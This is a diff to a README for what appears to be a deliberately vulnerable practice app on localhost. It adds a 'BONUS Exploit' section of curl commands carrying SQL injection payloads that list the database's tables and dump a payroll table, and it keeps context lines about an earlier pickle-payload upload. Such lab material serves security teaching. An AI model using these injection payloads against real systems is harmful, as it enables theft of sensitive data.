@@ -100,3 +100,21 @@ Docker Build:
     ```bash
     curl -L -F 'file=@inapickle/payload.txt' localhost:8000/restore-sqlite
     ```
+
+## BONUS Exploit - SQL Injection
+
+1. Discover another sensitive table in the database:
+
+    ```bash
+    curl -XPOST 'http://localhost:8000/read-contact' \
+      -H 'Content-Type: application/json' \
+      --data-raw $'{"first_name":"\' or 1=1 UNION SELECT * FROM sqlite_schema WHERE type = \'table\';--","last_name":""}'
+    ```
+
+2. Dump payroll table:
+
+    ```bash
+    curl -XPOST 'http://localhost:8000/read-contact' \
+      -H 'Content-Type: application/json' \
+      --data-raw $'{"first_name":"\' or 1=1 UNION SELECT *,1 FROM payroll;--","last_name":""}'
+    ```
